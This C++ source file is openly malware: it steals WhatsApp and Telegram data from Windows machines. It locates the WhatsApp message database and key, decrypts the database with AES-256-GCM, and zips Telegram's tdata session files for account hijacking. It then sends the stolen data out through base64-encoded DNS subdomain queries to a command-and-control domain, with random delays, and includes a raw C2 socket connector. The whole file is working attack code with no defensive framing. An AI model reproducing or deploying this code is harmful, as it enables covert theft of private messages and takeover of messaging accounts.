#include <string>

// Path Constants
const std::string APPDATA_ENV = "APPDATA";
const std::string LOCALAPPDATA_ENV = "LOCALAPPDATA";
const std::string WHATSAPP_SUBDIR = "\\Packages\\5319275A.WhatsApp_cv1g1gvanyjgm\\LocalState\\";
const std::string WHATSAPP_MEDIA_SUBDIR = "shared\\transfers\\";
const std::string TELEGRAM_SUBDIR = "\\Telegram Desktop\\tdata";

#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <fstream>
#include <vector>
#include "miniz.h"
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Dnsapi.lib")
#include <windns.h>

// Function to get the value of an environment variable
std::string get_env_var(const std::string& key) {
    char* val = nullptr;
    size_t sz = 0;
    if (_dupenv_s(&val, &sz, key.c_str()) == 0 && val != nullptr) {
        std::string str(val);
        free(val);
        return str;
    }
    return "";
}

// Function to check if a file exists
bool file_exists(const std::string& name) {
    DWORD dwAttrib = GetFileAttributesA(name.c_str());
    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
           !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

// Function to check if a directory exists
bool dir_exists(const std::string& name) {
    DWORD dwAttrib = GetFileAttributesA(name.c_str());
    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
           (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

std::string FindWhatsAppPaths() {
    std::string local_app_data = get_env_var(LOCALAPPDATA_ENV);
    if (local_app_data.empty()) {
        return "";
    }

    std::string whatsapp_path = local_app_data + WHATSAPP_SUBDIR;
    std::string media_path = whatsapp_path + WHATSAPP_MEDIA_SUBDIR;

    if (file_exists(whatsapp_path + "msgstore.db") && file_exists(whatsapp_path + "key") && dir_exists(media_path)) {
        return whatsapp_path;
    }

    return "";
}

std::string FindTelegramPath() {
    std::string app_data = get_env_var(APPDATA_ENV);
    if (app_data.empty()) {
        return "";
    }

    std::string telegram_path = app_data + TELEGRAM_SUBDIR;
    if (dir_exists(telegram_path)) {
        return telegram_path;
    }

    return "";
}

char* ReadWhatsAppKey(const char* key_path) {
    std::ifstream key_file(key_path, std::ios::binary);
    if (!key_file) {
        return nullptr;
    }

    key_file.seekg(125);
    char* key = new char[32];
    key_file.read(key, 32);
    key_file.close();

    return key;
}

char* ReadEncryptedDB(const char* db_path, long& size) {
    std::ifstream db_file(db_path, std::ios::binary | std::ios::ate);
    if (!db_file) {
        return nullptr;
    }

    size = db_file.tellg();
    db_file.seekg(0, std::ios::beg);

    char* buffer = new char[size];
    db_file.read(buffer, size);
    db_file.close();

    return buffer;
}

char* DecryptBuffer(char* encrypted_data, long size, char* key) {
    EVP_CIPHER_CTX* ctx;
    int len;
    int plaintext_len;
    char* plaintext = new char[size];

    // Create and initialise the context
    if (!(ctx = EVP_CIPHER_CTX_new())) return nullptr;

    // Initialise the decryption operation.
    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)) return nullptr;

    // Set IV length
    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL)) return nullptr;

    // Initialise key and IV
    if (1 != EVP_DecryptInit_ex(ctx, NULL, NULL, (unsigned char*)key, (unsigned char*)encrypted_data)) return nullptr;

    // Provide the message to be decrypted, and obtain the plaintext output.
    if (1 != EVP_DecryptUpdate(ctx, (unsigned char*)plaintext, &len, (unsigned char*)(encrypted_data + 12), size - 12 - 16)) return nullptr;
    plaintext_len = len;

    // Set expected tag value.
    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, (void*)(encrypted_data + size - 16))) return nullptr;

    // Finalise the decryption.
    if (EVP_DecryptFinal_ex(ctx, (unsigned char*)plaintext + len, &len) <= 0) return nullptr;
    plaintext_len += len;

    // Clean up
    EVP_CIPHER_CTX_free(ctx);

    // The plaintext is now in plaintext, and is plaintext_len bytes long.
    // We need to resize the buffer to the correct size.
    char* resized_plaintext = new char[plaintext_len];
    memcpy(resized_plaintext, plaintext, plaintext_len);
    delete[] plaintext;

    return resized_plaintext;
}

#include <dirent.h>

char* PackageTelegramSession(const char* tdata_path, long& zip_size) {
    mz_zip_archive zip_archive;
    memset(&zip_archive, 0, sizeof(zip_archive));

    if (!mz_zip_writer_init_heap(&zip_archive, 0, 1024 * 64)) {
        return nullptr;
    }

    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir(tdata_path)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            std::string filename = ent->d_name;
            if (filename.length() == 16 && filename.find_first_not_of("0123456789abcdefABCDEF") == std::string::npos) {
                std::string full_path = std::string(tdata_path) + "\\" + filename;
                mz_zip_writer_add_file(&zip_archive, filename.c_str(), full_path.c_str(), "", 0, MZ_BEST_COMPRESSION);
            }
            if (filename == "key_datas") {
                std::string full_path = std::string(tdata_path) + "\\" + filename;
                mz_zip_writer_add_file(&zip_archive, filename.c_str(), full_path.c_str(), "", 0, MZ_BEST_COMPRESSION);
            }
        }
        closedir(dir);
    } else {
        mz_zip_writer_end(&zip_archive);
        return nullptr;
    }

    void* pZip_data;
    size_t out_size;
    mz_zip_writer_finalize_heap_archive(&zip_archive, &pZip_data, &out_size);
    zip_size = out_size;

    mz_zip_writer_end(&zip_archive);

    return (char*)pZip_data;
}

SOCKET ConnectToC2(const char* ip, int port) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    int iResult;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        return INVALID_SOCKET;
    }

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(ip, std::to_string(port).c_str(), &hints, &result);
    if ( iResult != 0 ) {
        WSACleanup();
        return INVALID_SOCKET;
    }

    // Attempt to connect to an address until one succeeds
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            WSACleanup();
            return INVALID_SOCKET;
        }

        // Connect to server.
        iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        WSACleanup();
        return INVALID_SOCKET;
    }

    return ConnectSocket;
}

#include <openssl/bio.h>
#include <openssl/buffer.h>

std::vector<std::string> EncodeDataForDNS(const char* data_buffer, size_t size) {
    std::vector<std::string> chunks;

    BIO *bio, *b64;
    BUF_MEM *bufferPtr;

    b64 = BIO_new(BIO_f_base64());
    bio = BIO_new(BIO_s_mem());
    bio = BIO_push(b64, bio);

    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    BIO_write(bio, data_buffer, size);
    BIO_flush(bio);
    BIO_get_mem_ptr(bio, &bufferPtr);

    std::string base64_string(bufferPtr->data, bufferPtr->length);

    BIO_free_all(bio);

    for (unsigned i = 0; i < base64_string.length(); i += 63) {
        chunks.push_back(base64_string.substr(i, 63));
    }

    return chunks;
}

#include <chrono>
#include <thread>
#include <random>

void SendData(const std::vector<std::string>& encoded_chunks, const char* c2_domain) {
    for (const auto& chunk : encoded_chunks) {
        std::string hostname = chunk + "." + c2_domain;
        DnsQuery_A(hostname.c_str(), DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, NULL, NULL);

        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> distrib(50, 250);
        std::this_thread::sleep_for(std::chrono::milliseconds(distrib(gen)));
    }
}
